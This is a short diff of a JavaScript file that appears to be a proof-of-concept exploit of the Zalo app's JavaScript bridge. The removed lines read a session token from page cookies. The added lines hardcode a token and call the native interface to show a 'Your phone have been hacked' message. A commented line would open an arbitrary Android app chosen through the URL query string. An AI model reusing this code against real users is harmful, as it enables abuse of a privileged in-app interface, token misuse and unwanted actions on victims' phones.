@@ -28,24 +28,17 @@ function getCookie(cname) {
 }
 
 
-var domain_u = document.domain
-var jstoken = getCookie(domain_u+"_zlink3rd");
-alert("jstoken: " + jstoken);
+// var domain_u = document.domain
+// var jstoken = getCookie(domain_u+"_zlink3rd");
+// alert("jstoken: " + jstoken);
 
 var action = "action.show.toast"
 var accessToken = "abc"
 var options = '{"data":{"hsbdshdbhshsbdshdb"}}'
 
-
 var callbackfunc = null;
 
-// jstoken = "v2_htiQcpn/irTPVmSdx1DQwxw1qQRoSZapmWph3CzFMJmVkElU9zROArVY0iNHKO4g0Czxhmis3gG8UPE0RLuDzw==";
-// alert("jstoken: " + jstoken);
-
-// ZaloJavaScriptInterface.jsCall(jstoken,"action.show.toast", "aas",'{"toast":"123, Your phone have been hacked, vừng ơi mở camera ra!"}', null);
-
-// jstoken = "v3_htiQcpn/irTPVmSdx1DQwxw1qQRoSZapmWph3CzFMJmVkElU9zROArVY0iNHKO4g0Czxhmis3gG8UPE0RLuDzw==";
-// alert("zalo.me_zlink3rd: " + jstoken);
+var jstoken = "v2_htiQcpn/irTPVmSdx1DQwxw1qQRoSZapmWph3CzFMJmVkElU9zROArVY0iNHKO4g0Czxhmis3gG8UPE0RLuDzw==";
 ZaloJavaScriptInterface.jsCall(jstoken,"action.show.toast", "aas",'{"toast":"111, Your phone have been hacked, vừng ơi mở camera ra!"}', null);
 
 // ZaloJavaScriptInterface.jsCall(jstoken,"action.open.app", "aas",'{"android":{"package":"'+location.search.slice(1)+'","url":""}}', "onJSCall");
